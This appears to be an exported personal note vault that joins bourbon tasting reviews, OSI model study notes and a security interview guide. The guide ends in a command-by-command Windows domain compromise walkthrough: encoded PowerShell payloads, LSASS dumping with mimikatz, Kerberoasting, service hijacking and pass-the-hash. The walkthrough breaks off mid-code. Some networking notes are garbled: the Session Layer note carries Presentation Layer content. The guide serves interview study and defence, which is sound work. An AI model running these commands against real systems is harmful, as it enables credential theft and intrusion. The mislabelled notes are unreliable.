notes.path: obsidian.main.vault/Whiskey Reviews/Review 2 - Hardin's Creek Jacob's Well 184 & 211 month.md
notes.content:
#### Glass: Glencairn - rested for 1h

#### 184mo Proof : 108 (54% ABV)

#### 211mo Proof: 109 (54.5% ABV)

#### 185mo Age: 15 & 16 year old blend

#### 211mo Age:  17.58 years old (youngest component)

#### Mashbill: Undisclosed

#### Appearance: The 211 month is a shade darker in proper lighting. The pictures might not do justice regarding color accuracy. Nonetheless, I would have expected these to be a tad darker for their age statements. 

I am fortunate enough to have found these bottles at acceptable secondary pricesa while back. I paid $230 for each 184 month, $260 for each of the 211's. These Jim Beam releases have flown under the radar, and after reading @u/vexmythocrut‚Äôs review today, I was reminded that I should get doing what I said I would do: review the 184 & 211 month HC's side by side. This has been a great review to write, knowing that these two are my #1 and #2 bottles in my collection. For context, here are the supposed mashbills:

### **Jacob‚Äôs Well 184-month**
- Blend of:
    - **High-rye bourbon mashbill** (78% corn, 12% rye, 10% malted barley) aged 15 years
    - **Traditional bourbon mashbill** (75% corn, 13% rye, 12% malted barley) aged 16 years
### **Jacob‚Äôs Well 211-month**
- Blend of:
    - **High-rye bourbon mashbill** (78% corn, 12% rye, 10% malted barley) aged 17 years and 7 months
    - **Traditional bourbon mashbill** (75% corn, 13% rye, 12% malted barley) aged 17 years and 7 months

### 184 Month:
## Nose
The nose on this has opened up from the last time I remember. A cherry cola/caramel note hits me right up front, which weirdly I didn‚Äôt get the first go around ‚Äî maybe reading @u/vexmythocrut‚Äôs review of the 184mo today influenced me. Next comes a deep, rich raspberry/cherry compote wrapped in well-aged oak, consistent with my last review. I‚Äôll reiterate from my initial notes: it‚Äôs still got that marzipan note I really enjoy. To round it off, there‚Äôs freshly ground black pepper, tobacco leaf, full-grain leather, and a bit of rye spice wrapped in a blanket of well-aged oak.

## Palate
From my last post, still stands: Well aged oak right off the bat, then a wave of deep dark brown sugar glaze on a thin wafer of well seasoned oak. You get that deep rich oak character. Then on the mid-palate I get notes of star anise and light clove as well as a sweet dark plum, dates, nutmeg and raisins. There is absolutley nothing sharp about this pour, it is balanced and the age really mellows it out on the palate. Imagine a graceful samurai, precise and controlled, striking with elegance rather than force. That‚Äôs this bourbon.. layered, patient, and confident without needing to shout.

## Finish
I stand by what I have written before in my previous review: The finish is lingering, but not too extended, a characteristic I would attribute to a much higher proof offering. But with that, it's still very pleasant. On the back end, the seasoned oak comes through alongside subtle notes of clove and star anise. There‚Äôs also a fleeting hint of fruit, like licking the spoon you used to stir a raspberry/cherry compote, warm, spiced, and faintly sweet.

### 211 Month:
## Nose
First thing I notice is that the ethanol is a bit subdued on the 211 compared to the 184, which is typical of higher age stated bourbons. The next scent I am hit with is a giant wave of expertly aged oak, followed by the same cherry cola note that's present on the 184 month. I am getting more fresh black pepper here, more leather, allspice, nutmeg, a bit of clove, and stewed figs, all harmoniously coming together like freshly baked cherry spice cake infused with warm nutmeg, clove, and allspice, topped with rich dried figs, and served beside a drizzle of pepper-infused caramel. The bouquet on this pour is amazing.

## Palate
Viscous, oily, and silky smooth. The mid-palate unfolds with layers of nuanced oak, followed by a rich cherry cola jam spread over a graham cracker, accented by freshly ground black pepper, nutmeg, clove, allspice, and a touch of molasses drizzle. If I were to relate the 211 month to a figure, they would be elegant, bold, and deeply layered, a gentleman of many stories.

## Finish
Finish is a tad bit longer than the 184mo, but truthfully, I'm spliting hairs here. There is a star anise note on this that I really enjoy, it lasts longer than the 184 mo. I also pick up a bit more leather and tobacco, which adds a pleasant richness. The finish is not too drying but you notice the oak tannins leaving your tounge a little parched, a quality that, to me, only adds character.

### Thoughts
This comparison llustrates how those extra 2-3 years transform a bourbon. While the 184-month shows elegance and balance, the 211-month demonstrates what patience can achieve. That subdued ethanol, enhanced viscosity, and deeper oak integration suggest a whiskey that's reached a different level of maturity. Considerign value, if you can get these at msrp, and given their age statements, these Hardin's Creek releases are on the premium end of the spectrum. The question becomes whether the marginal improvements in the 211-month (slightly longer finish, more integrated nose, silkier mouthfeel) justify what's likely a significant price premium. For collectors, probably yes. For drinkers, it might depend on the actual price delta.

As a last note, these are bottles that demand contemplation, not consumption. The kind you pour for those who can appreciate the decades of patience in each glass. Thank you for reading!!

### 184 month

notes.content:
![[IMG_7008.jpeg]]


![[IMG_7012.jpeg]]

![[IMG_7015.jpeg]]

![[ChatGPT Image May 18, 2025, 07_52_10 PM.png]]

Hey all! Loooong time lurker here, and as you can see from the title, this is my first ever review. I never thought I would write a review, but that's before I had the great pleasure of having a couple of pours of Jim Beam's (yes it's a Jim Beam product) Hardin's Creek Jacob's Well 184 month aged bourbon. This offering from Beam is incorporates 15y and 16y aged whiskey from two mashbills both from JB. Part the HC -JW 184mo whiskey comes from the mashbill from JB's main offerings of Jim Beam, Knob Creek, and Bookers. The other blended whiskey comes from the high rye mashbill of the Old Grand Dad line.


#### Glass: Glencairn - rested for 1h

#### Proof: 108 (54% ABV)

#### Age: 15 & 16 year old blend

#### Mashbill: Undisclosed

#### Appearance: Not as dark as I would have expected for a 15y+ product but still asemi-dark rich amber color.

## Nose
The first scent i get on the nose is a deep and rich raspberry/cherry compote wrapped in well aged oak. One thing this nose reminds me of is a toasted bearclaw pastry that's filled with almond paste or marzipan. But image it coming out of a toaster oven, where you get that burnt sugar smell/marzipan smell...just heavenly. Digging deep in the nose I get some star anise and I a faint hint of the rye spice. 

## Palate
Well aged oak right off the bat, then a wave of deep dark brown sugar glaze on a thin wafer of well seasoned oak. You get that deep rich oak character. Then on the mid-palate I get notes of star anise and light clove as well as a sweet dark plum, dates, nutmeg and raisins. There is absolutley nothing sharp about this pour, it is balanced and the age really mellows it out on the palate. Imagine a graceful samurai, precise and controlled, striking with elegance rather than force. That‚Äôs this bourbon.. layered, patient, and confident without needing to shout.

## Finish
The finish is lingering, but not too extended, a characteristic I would attribute to a much higher proof offering. But with that, it's still very pleasant. On the back end, the seasoned oak comes through alongside subtle notes of clove and star anise. There‚Äôs also a fleeting hint of fruit, like licking the spoon you used to stir a raspberry/cherry compote, warm, spiced, and faintly sweet.

## Thoughts
Like I said, I've been contempt with lingering around this subreddit for sometime but I have never gotten the urge to write a post until this whiskey graced my lips. It is such a well made bourbon that I felt compelled enough to tell you guys/gals about it. Anywho, after I had the first couple pours of this, I went to my local liquor store and bought the backup of this bottle. I couldn't resist the urge. I am really curious as to how the HC Jacob's Well batch 2 - 211 month stacks up against this. I will have to blind them down the road. I would be amazed if it is THAT much better. Thanks for reading. Cheers! üçª

notes.path: obsidian.main.vault/PayPal - Offensive Security Engineer/01 - Network Infra - Web App/OSI - TCPIP.md
notes.content:
### OSI Model

The OSI (Open Systems Interconnection) model is a conceptual framework that standardizes network communication functions into seven distinct layers:

1. **Physical Layer**: Transmits raw bit stream over physical medium (cables, wireless)
2. **Data Link Layer**: Provides node-to-node data transfer and error detection (MAC, LLC)
3. **Network Layer**: Handles packet routing between networks (IP)
4. **Transport Layer**: Ensures complete data transfer and connection management (TCP, UDP)
5. **Session Layer**: Establishes, manages, and terminates connections
6. **Presentation Layer**: Translates data between application and network formats (encryption, compression)
7. **Application Layer**: Provides network services directly to end-users (HTTP, FTP, SMTP)

### TCP/IP Model

The TCP/IP model is a simplified, practical implementation of networking principles with four layers:

1. **Network Interface Layer**: Handles physical connection and hardware addressing (similar to OSI's Physical and Data Link layers)
2. **Internet Layer**: Manages logical addressing and routing between networks (IP protocol, equivalent to OSI's Network layer)
3. **Transport Layer**: Provides end-to-end communication and reliability (TCP/UDP, equivalent to OSI's Transport layer)
4. **Application Layer**: Combines OSI's Session, Presentation, and Application layers to handle user interfaces and applications (HTTP, FTP, DNS, SMTP)
    

Unlike the theoretical [[OSI Model]], TCP/IP was developed for practical implementation and forms the foundation of today's internet communications.

notes.path: obsidian.main.vault/OSI Model/Transport Layer (Layer 4).md
notes.content:
The #Transport Layer is the fourth layer in the OSI (Open Systems Interconnection) model and plays a crucial role in the delivery of data across network connections. It's responsible for providing transparent transfer of data between end systems, or hosts, and is responsible for error recovery and flow control. Here‚Äôs a deeper dive into its functions and characteristics:

### Purpose and Functions
1. **Segmentation and Reassembly**: The Transport Layer takes messages from the Session Layer and splits them into smaller units, known as segments, for easier handling by the network. At the destination, it reassembles these segments into complete messages that are passed to the Session Layer.

2. **Connection Control**: It can be either connection-oriented or connectionless. Connection-oriented transport (like TCP) establishes a connection before transmitting data, ensures all packets arrive in order, and checks for errors. Connectionless transport (like UDP), on the other hand, sends packets without establishing a connection, offering quicker delivery where reliability is less critical.

3. **Error Control**: It is responsible for error-checking and reliable data transfer. This includes detecting corrupted or lost segments and requesting retransmissions if necessary.

4. **Flow Control**: The Transport Layer manages the rate of data transmission between two endpoints to prevent a fast sender from overwhelming a slow receiver.

5. **Port Management**: It uses header information in the packets to direct segments to the correct process on the destination computer by using port numbers.

### Key Protocols
- **[[TCP]] (Transmission Control Protocol)**: A connection-oriented protocol that ensures reliable transmission of data. It is used when the accuracy of data delivery is critical, such as in file transfers or web page retrievals.
- **[[UDP]] (User Datagram Protocol)**: A connectionless protocol used for services that require fast, efficient delivery, such as broadcasting video or voice over the internet.

### Examples of Use
- **[[TCP]]** is used for web browsing, email, and file transfers where data integrity and order are crucial.
- **[[UDP]]** is often used for real-time applications like video streaming or online gaming, where speed is more critical than perfect accuracy.

### Interaction with Other Layers
The Transport Layer receives data from the Session Layer above it and segments the data for delivery to the Network Layer below, which is responsible for data routing and delivery across network boundaries. The success of the Transport Layer depends significantly on the underlying network's capabilities, specifically in terms of handling congestion and ensuring timely data delivery.

Understanding the Transport Layer is especially important in fields like network engineering and cybersecurity, as it handles the critical tasks of ensuring data integrity and efficient data flow between hosts. This layer's protocols and mechanisms are pivotal in designing networks that are both reliable and secure.

notes.path: obsidian.main.vault/OSI Model/Session Layer (Layer 5).md
notes.content:
The #Session Layer is the fifth layer of the OSI (Open Systems Interconnection) model, which serves a crucial role in controlling the dialogues (connections) between computers. It establishes, manages, and terminates connections between the local and remote applications. Here‚Äôs a detailed look at the functions and characteristics of the Session Layer:
### Purpose and Functions
1. **Data Translation**: It converts data from the format used by the application layer into a common format at the sending station, and then back from the common format to the application's format at the receiving station. This ensures that data sent from the application layer of one system can be read by the application layer of another system.

2. **Data Compression**: Reducing the size of the data to be transmitted. Compression can be either lossless, where no information is lost in the compression, or lossy, where some quality of non-critical information is lost to reduce the size of the data further.

3. **Data Encryption and Decryption**: It handles the encryption and decryption needed for secure data transmission. Encryption at this layer ensures that data can be securely transmitted over a network.

### Key Protocols and Standards
- **ASCII** and **EBCDIC** for character encoding.
- **JPEG**, **MPEG**, and other multimedia formats for data compression and encoding.
- **SSL/TLS** for encrypting information that moves across the network.

### Examples of Use
- When accessing a website securely via HTTPS, the SSL/TLS protocols at the Presentation Layer encrypt the data before it is transmitted over the Internet and decrypt it upon arrival before it is processed by an application.
- When sending an email with attachments, the Presentation Layer might compress the data to facilitate quicker transmission.

### Interaction with Other Layers
The Presentation Layer interacts with the Application Layer above it by providing it data in a format that the application can accept, whether it involves translating data between formats, decompressing data, or decrypting information. Below it, the Session Layer establishes, manages, and terminates connections between applications, providing the synchronization and checkpointing needed to support the data exchange processes handled in the Presentation Layer.

In the context of cybersecurity, the Presentation Layer's roles in encryption and data representation are vital. Ensuring that data is encrypted during transmission helps protect sensitive information from interception, and effective data compression can reduce the attack surface by minimizing the amount of data transmitted over the network. Understanding these aspects of the Presentation Layer can significantly enhance security measures and optimize network operations.

notes.path: obsidian.main.vault/OSI Model/Presentation Layer (Layer 6).md
notes.content:
The #Presentation Layer is the sixth layer of the OSI (Open Systems Interconnection) model, sitting just below the Application Layer and above the Session Layer. This layer is crucial because it acts as the translator or data formatter in the networking process. Here‚Äôs a more detailed look at the functions and characteristics of the Presentation Layer:

### Purpose and Functions
1. **Data Translation**: It converts data from the format used by the application layer into a common format at the sending station, and then back from the common format to the application's format at the receiving station. This ensures that data sent from the application layer of one system can be read by the application layer of another system.

2. **Data Compression**: Reducing the size of the data to be transmitted. Compression can be either lossless, where no information is lost in the compression, or lossy, where some quality of non-critical information is lost to reduce the size of the data further.

3. **Data Encryption and Decryption**: It handles the encryption and decryption needed for secure data transmission. Encryption at this layer ensures that data can be securely transmitted over a network.

### Key Protocols and Standards
- **ASCII** and **EBCDIC** for character encoding.
- **JPEG**, **MPEG**, and other multimedia formats for data compression and encoding.
- **SSL/TLS** for encrypting information that moves across the network.

### Examples of Use
- When accessing a website securely via HTTPS, the SSL/TLS protocols at the Presentation Layer encrypt the data before it is transmitted over the Internet and decrypt it upon arrival before it is processed by an application.
- When sending an email with attachments, the Presentation Layer might compress the data to facilitate quicker transmission.

### Interaction with Other Layers
The Presentation Layer interacts with the Application Layer above it by providing it data in a format that the application can accept, whether it involves translating data between formats, decompressing data, or decrypting information. Below it, the Session Layer establishes, manages, and terminates connections between applications, providing the synchronization and checkpointing needed to support the data exchange processes handled in the Presentation Layer.

In the context of cybersecurity, the Presentation Layer's roles in encryption and data representation are vital. Ensuring that data is encrypted during transmission helps protect sensitive information from interception, and effective data compression can reduce the attack surface by minimizing the amount of data transmitted over the network. Understanding these aspects of the Presentation Layer can significantly enhance security measures and optimize network operations.

notes.path: obsidian.main.vault/OSI Model/OSI Model.md
notes.content:
---
aliases:
---

[[**OSI Model**]]

7 - Application - Human-computer interaction | HTTP, DNS, FTP, POP3

6 - Presentation - Data representation and encryption | SSH, SSL, IMAP, FTP, JPEG

5 - Session - Connection maintenance | API's, sockets

4 - Transport - End-to-end connections | TCP, UDP

3 - Network -¬† Logical addressing for data path using packets | IP, ICMP, IGMP¬†

2 - Data - Physical addressing, formatting data in frames switch, bridge, ethernet

1 - Physical - transmission of signals, media, or binary raw bits | Physical coax, fiber, wireless

## OSI Model Components

### 7. Application Layer

- **Function**: Facilitates human-computer interaction by providing services to end-user applications.
- **Protocols**: HTTP (Hypertext Transfer Protocol), DNS (Domain Name System), FTP (File Transfer Protocol), POP3 (Post Office Protocol version 3).
- **Explanation**: This layer is where applications and services communicate with each other. For example, HTTP is used for web browsing, DNS translates domain names to IP addresses, FTP is used for file transfers, and POP3 is used for email retrieval.

### 6. Presentation Layer

- **Function**: Handles data representation and encryption to ensure that data is in a usable format and secure.
- **Protocols**: SSH (Secure Shell), SSL (Secure Sockets Layer), IMAP (Internet Message Access Protocol), FTP, JPEG (Joint Photographic Experts Group).
- **Explanation**: This layer is responsible for data formatting, compression, and encryption. SSH provides secure remote access, SSL/TLS secures web communications, IMAP is used for email access, and JPEG is a format for image compression.

### 5. Session Layer

- **Function**: Manages connections between applications running on different devices.
- **Protocols**: APIs (Application Programming Interfaces), sockets.
- **Explanation**: This layer establishes, maintains, and terminates connections between applications. APIs and sockets are used to manage these connections, ensuring that data is exchanged correctly between applications.

### 4. Transport Layer

- **Function**: Provides end-to-end connections and ensures reliable data transfer.
- **Protocols**: TCP (Transmission Control Protocol), UDP (User Datagram Protocol).
- **Explanation**: This layer is responsible for ensuring that data is delivered reliably and in the correct order. TCP provides connection-oriented, reliable service, while UDP offers connectionless, best-effort service.

### 3. Network Layer

- **Function**: Routes data between devices on different networks using logical addressing.
- **Protocols**: IP (Internet Protocol), ICMP (Internet Control Message Protocol), IGMP (Internet Group Management Protocol).
- **Explanation**: This layer is responsible for routing data between networks. IP provides logical addressing, ICMP is used for error-reporting and diagnostic functions, and IGMP manages multicast groups.

### 2. Data Link Layer

- **Function**: Provides physical addressing and formats data into frames for transmission over a network.
- **Protocols**: Ethernet, switches, bridges.
- **Explanation**: This layer is responsible for framing, error detection and correction, and flow control. Ethernet is a common protocol used for local area networks (LANs), and switches and bridges are devices that operate at this layer to forward data frames.

### 1. Physical Layer

- **Function**: Transmits raw bits over a physical medium.
- **Protocols**: Physical coax, fiber, wireless.
- **Explanation**: This layer is responsible for the physical transmission of data. It defines the electrical, mechanical, procedural, and functional specifications for activating, maintaining, and deactivating the physical link between devices. Common media include coaxial cables, fiber optic cables, and wireless communication.

notes.path: obsidian.main.vault/OSI Model/Network Layer (Layer 3).md
notes.content:
The #Network Layer is the third layer of the OSI (Open Systems Interconnection) model and is crucial for managing the delivery of data packets across different networks. It handles the routing of packets, including their forwarding and addressing, to ensure they reach their correct destination. Here's a detailed look at the functions and characteristics of the Network Layer:

### Purpose and Functions
1. **Routing**: The Network Layer is responsible for determining the best path through the network for data to travel from the source to the destination. This involves analyzing the network conditions, the topology, and the routing table to make efficient routing decisions.

2. **Logical Addressing**: It assigns logical addresses (such as IP addresses in the TCP/IP protocol suite) to devices, which helps in identifying the source and destination of the data packets across multiple networks. This addressing helps routers in making decisions about packet forwarding.

3. **Packetizing**: It encapsulates the transport layer data segments into packets, which are known as datagrams in this context. These packets are the units of data that are routed and switched through the network.

4. **Error Handling and Diagnostics**: Implements error reporting mechanisms to manage packet handling problems, such as incorrect routing or delivery failures. Protocols like ICMP (Internet Control Message Protocol) are used for diagnostic and error-reporting purposes.

### Key Protocols
- **[[IP]] (Internet Protocol)**: The primary protocol used for relaying datagrams across network boundaries. It's used in both IPv4 and IPv6 forms.
- **[[ICMP]] (Internet Control Message Protocol)**: Used for sending error messages and operational information indicating success or failure when IP packets are processed.
- **[[Routing Protocols]]** like RIP (Routing Information Protocol), OSPF (Open Shortest Path First), and BGP (Border Gateway Protocol), which are used to manage routing decisions and share routing information across networks.

### Examples of Use
- **IP Addressing**: Every device connected to the Internet is assigned an IP address. This address is used to ensure that data sent from one device reaches the intended destination device correctly.
- **Routing**: When you send an email, the data packets are sent through various network paths to reach the recipient‚Äôs server; this path determination is handled by the Network Layer.

### Interaction with Other Layers
The Network Layer receives packets from the Transport Layer above it and encapsulates these into packets. Below it, the Data Link Layer is responsible for transmitting the packets over a single link. At the receiving end, the Network Layer ensures that the packets are properly routed to the correct destination application via the transport layer.

In cybersecurity and network design, the Network Layer is crucial because it interfaces different network segments, managing the data traffic and network congestion effectively. Misconfigurations or vulnerabilities at this layer can lead to security risks such as data interception or denial of service, making its understanding essential for securing network infrastructure.

notes.path: obsidian.main.vault/OSI Model/Application Layer (Layer 7).md
notes.content:
The user's browser (application) makes an HTTP request to a website.

The application prepares the data for transfer, which includes encapsulating the HTTP request with application layer headers.

Sure! The #Application Layer is the seventh and topmost layer of the OSI (Open Systems Interconnection) model. It serves as the interface between the network services and the applications that users interact with. Here's a closer look at its key functions and characteristics:

### Purpose and Functions
1. **End-User Services**: This layer provides services directly to the end-user applications. It is where communication begins and ends, translating data from a format that applications understand to one suitable for the underlying network processes.
  
2. **Data Access Abstraction**: It abstracts the details of network data structures and the underlying transport layers from the applications. This means that application developers don‚Äôt need to worry about the complexities of the network details.

3. **Session Management**: It manages sessions between networked applications, handling service requests and responses that are sent between peers.

4. **Protocol Implementation**: Various protocols operate at the application layer, including HTTP (for web browsing), FTP (for file transfers), SMTP (for email transmission), and DNS (for domain name resolution).

### Key Protocols
- **[[HTTP]]** (Hypertext Transfer Protocol): Enables web browsing by communicating between web servers and clients.
- **[[FTP]]** (File Transfer Protocol): Allows users to upload and download files from a remote server.
- **[[SMTP]]** (Simple Mail Transfer Protocol): Facilitates sending emails from clients to servers and between servers.
- **[[DNS]]** (Domain Name System): Translates domain names (like www.example.com) into IP addresses that networks use to locate and identify services.

### Examples of Use
- When you visit a website, your browser uses HTTP to request web pages and resources from web servers.
- When you send an email, your email client uses SMTP to send your message to the recipient through email servers.

### Interaction with Other Layers
While it's the topmost layer from a conceptual standpoint, in practice, applications often bundle several OSI layers together when they communicate over a network. For instance, web browsers incorporate presentation and session layer functions as they manage data encoding and keep track of your interactions with a web server.

The Application Layer interacts with the Presentation Layer directly beneath it, which manages data formats and encryption, ensuring that the data is in a usable format or securely encrypted as needed by the application layer protocol.

Understanding the Application Layer is crucial, especially in fields like cybersecurity and network management, as it directly interacts with user data and services, making it a primary target for security attacks. Knowing how it works can help in designing better security protocols and monitoring tools to protect sensitive information.

notes.path: obsidian.main.vault/Job Interview Prep/Rapid7/Interview Prep/Technical/Fundamental Security Concepts.md
notes.content:
# Security Interview Study Guide: Core Attack Concepts

A concise reference covering fundamental attack techniques, real-world examples, and defensive measures.

---

# Core Attack Techniques

## 1. Lateral Movement

**What it is:** How attackers move from one compromised system to other systems within a network to reach higher-value targets or data.

**Why it matters:** Prevents a single compromised machine from becoming a company-wide breach.

**Common techniques:**
- Pass-the-Hash / Pass-the-Ticket with stolen credentials
- Remote services (RDP, SMB, WinRM, SSH)
- Exploiting trust relationships (shared admin accounts, AD misconfigurations)

**Windows Example:**
- Attacker phishes a user and gains access to their workstation
- They dump LSASS memory and extract NTLM hash for a domain admin account
- Using PsExec or WMI with the hash, they authenticate to a file server without needing the plaintext password
- From there, they pivot to a domain controller using the same credentials

**Linux Example:**
- Attacker compromises a web server and discovers SSH private keys in a developer's home directory
- The keys lack passphrases and have corresponding authorized_keys entries on multiple systems
- Using the stolen keys, they SSH to a database server, then to an internal GitLab instance
- They find cloud credentials in a CI/CD configuration file for further access

---

## 2. Privilege Escalation

**What it is:** Gaining higher access levels (e.g., standard user ‚Üí local admin ‚Üí domain admin).

**Why it matters:** Higher privileges allow attackers to disable defenses, access sensitive data, and establish deeper footholds.

**Common techniques:**
- Exploiting unpatched vulnerabilities (kernel bugs, service misconfigurations)
- Abusing weak service permissions or scheduled tasks
- Credential harvesting from memory (LSASS) and token reuse
- Misconfigured sudoers or setuid binaries (Linux)

**Windows Example:**
- Attacker finds a service running as SYSTEM with weak file permissions using `accesschk.exe`
- The service binary is located in `C:\Program Files\VulnApp\service.exe` and is writable by the current user
- They replace the executable with a malicious payload that adds their account to the local Administrators group
- After restarting the service with `sc stop/start`, the payload executes as SYSTEM

**Linux Example:**
- Attacker discovers `/usr/bin/backup-script` has the setuid bit set and runs as root
- The script uses relative paths to call system commands (e.g., `tar` without full path)
- They modify their PATH environment variable to include a malicious directory first
- When they execute the setuid binary, it calls their malicious `tar` script instead, running commands as root

---

## 3. Persistence

**What it is:** Techniques to maintain access across reboots, password changes, or partial remediation efforts.

**Why it matters:** Without persistence, a simple reboot could evict the attacker.

**Common techniques:**
- **Autoruns:** Registry Run keys, Startup folders, Launch Agents/Daemons (macOS)
- Scheduled tasks / cron jobs
- Service installation or driver planting
- **Domain persistence:** Golden/Silver Tickets, rogue OAuth apps, AdminSDHolder manipulation
- **Living-off-the-land:** WMI event subscriptions

**Windows Example:**
- Attacker creates a scheduled task named "WindowsUpdateCheck" that appears legitimate
- Task runs as SYSTEM and executes every hour: `powershell.exe -NoP -W Hidden -Enc <base64_payload>`
- The payload beacons to C2 infrastructure and pulls down additional commands
- Alternatively, they create a WMI event subscription that triggers on user logon events

**Linux Example:**
- Attacker adds a cron job to the root crontab: `@reboot /usr/bin/.update-system > /dev/null 2>&1`
- The `.update-system` script is their reverse shell that connects back to C2
- They also add an SSH public key to `/root/.ssh/authorized_keys` for direct access
- For stealth, they modify `/etc/ld.so.preload` to load a rootkit library that hides processes and network connections

---

## 4. Command and Control (C2)

**What it is:** How compromised systems receive instructions and report back to the attacker.

**Why it matters:** Disrupting C2 breaks the attacker's ability to coordinate and advance their objectives.

**Common channels:**
- HTTP/HTTPS beacons to cloud or VPS infrastructure
- DNS tunneling (commands/data encoded in DNS queries)
- Legitimate platforms abused as relays (Slack, GitHub, Pastebin)
- Covert channels (TLS over non-standard ports, ICMP)

**Example:**
- Malware beacons every 5 minutes over HTTPS to a domain resembling a legitimate software update site, retrieves tasks, and exfiltrates results

---

## 5. Defense Evasion

**What it is:** Techniques to avoid detection by security tools and analysts.

**Why it matters:** Successful evasion extends attacker dwell time and increases impact.

**Common techniques:**
- Obfuscating scripts (PowerShell encoding, XOR encryption)
- Using signed binaries (LOLBins: rundll32, mshta, certutil)
- Disabling EDR/AV or tampering with logs
- Process masquerading and injection
- Timestomping and clearing event logs

**Example:**
- Running malicious code via Microsoft-signed rundll32.exe to blend in with legitimate system activity

---

## 6. Data Exfiltration

**What it is:** Stealing data from the network to an external location under attacker control.

**Why it matters:** Often the ultimate objective in breaches (IP theft, customer data, financial records).

**Common techniques:**
- Direct upload over HTTPS to attacker infrastructure or cloud storage
- Chunked exfiltration via DNS or ICMP to bypass egress controls
- Abusing legitimate sync tools (OneDrive, Dropbox, Box)
- Exfiltration via email or messaging APIs

**Example:**
- Attacker compresses and encrypts a database dump, then uploads it in small HTTPS chunks to an S3 bucket to evade volume-based alerts

---

## 7. Discovery & Credential Access

These reconnaissance and access techniques typically precede the core attack chain:

**Discovery:**
- Enumerating users, groups, systems, shares, and security controls
- Example: Using PowerView or native AD cmdlets to identify systems where domain admins are logged in

**Credential Access:**
- Stealing passwords, tokens, or hashes from memory or storage
- Example: Dumping LSASS memory to extract plaintext passwords and Kerberos tickets

---

## Typical Attack Flow

A realistic kill chain demonstrating how these techniques interconnect:

1. **Initial Access:** Phishing email delivers malware to a user's workstation
2. **Discovery:** Enumerate the network and Active Directory to identify high-value targets
3. **Credential Access:** Dump LSASS memory to harvest credentials
4. **Privilege Escalation:** Exploit vulnerable service to gain local SYSTEM privileges
5. **Lateral Movement:** Use stolen admin credentials to access file servers and domain controllers
6. **Persistence:** Install scheduled task and WMI event subscription
7. **Command & Control:** Establish HTTPS beacon to cloud-hosted C2 infrastructure
8. **Exfiltration:** Compress, encrypt, and upload sensitive files to attacker-controlled cloud storage

---

## Defensive Measures by Technique

### Lateral Movement
- Enforce least privilege and network segmentation
- Disable unnecessary remote protocols (RDP, SMB, WinRM)
- Implement PAM/JIT access controls
- Deploy unique local admin passwords (LAPS)

### Privilege Escalation
- Maintain aggressive patch cadence
- Harden service permissions and scheduled tasks
- Monitor for abnormal token usage and integrity level changes

### Persistence
- Audit autoruns, scheduled tasks, and service installations
- Monitor Active Directory for suspicious modifications
- Enforce MFA everywhere and review OAuth app grants regularly

### Command & Control
- Implement egress filtering and DNS monitoring
- Deploy SSL/TLS inspection where appropriate
- Monitor for beaconing patterns and anomalous traffic

### Defense Evasion
- Enable comprehensive logging (Sysmon, PowerShell Script Block Logging)
- Monitor for LOLBin abuse and unsigned script execution
- Implement EDR with tamper protection

### Data Exfiltration
- Deploy DLP solutions and egress controls
- Implement anomaly detection for large or unusual transfers
- Encrypt sensitive data at rest and in transit

---

## Detailed Technical Walkthrough

This section provides step-by-step technical details for educational purposes. Understanding these techniques is essential for security professionals to detect, prevent, and respond to real-world attacks.

### Scenario: Windows Domain Environment Compromise

#### Phase 1: Initial Access & Discovery

**Step 1: Initial Compromise**
```powershell
# Attacker sends phishing email with malicious macro
# Macro executes PowerShell to download and run Cobalt Strike beacon
powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64_encoded_payload>
```

**Step 2: Situational Awareness**
```powershell
# Check current privileges and context
whoami /all
net user %username% /domain
nltest /domain_trusts

# Identify security tools
Get-Process | Where-Object {$_.ProcessName -match 'defender|edr|crowdstrike|carbon'}
Get-Service | Where-Object {$_.DisplayName -match 'antivirus|edr|defender'}

# Enumerate the domain
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

**Step 3: Network Enumeration**
```powershell
# Using built-in tools (Living off the Land)
nltest /dclist:
net view /domain
arp -a
ipconfig /all

# PowerView for AD enumeration (if able to load)
Import-Module .\PowerView.ps1
Get-DomainComputer
Get-DomainUser -SPN  # Find Kerberoastable accounts
Find-LocalAdminAccess  # Where can we move?
Get-DomainGPOLocalGroup  # GPO-based admin assignments
```

#### Phase 2: Credential Access

**Step 4: Dump LSASS Memory**
```powershell
# Method 1: Using Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Method 2: Creating a process dump (less detected)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Method 3: Using ProcDump (Microsoft signed)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Step 5: Extract Credentials**
```powershell
# Parse the dump file offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Results might include:
# - NTLM hashes for Pass-the-Hash
# - Kerberos tickets for Pass-the-Ticket
# - Plaintext passwords (if WDigest enabled)
```

**Step 6: Kerberoasting (if needed)**
```powershell
# Request service tickets for accounts with SPNs
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"

# Export tickets
mimikatz.exe "kerberos::list /export" "exit"

# Crack offline with hashcat
hashcat -m 13100 tickets.txt wordlist.txt
```

#### Phase 3: Privilege Escalation

**Step 7: Local Privilege Escalation**
```powershell
# Check for unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows"

# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *

# Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit example: Weak service permissions
sc config VulnService binpath= "C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### Phase 4: Lateral Movement

**Step 8: Pass-the-Hash to Target System**
```powershell
# Using Impacket's psexec.py (from Linux)
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50

# Using Mimikatz for Pass-the-Ticket
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe"

# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --exec-method smbexec
```

**Step 9: WMI/WinRM for Lateral Movement**
```powershell
# WinRM (requires credentials or hash)
$cred = Get-Credential
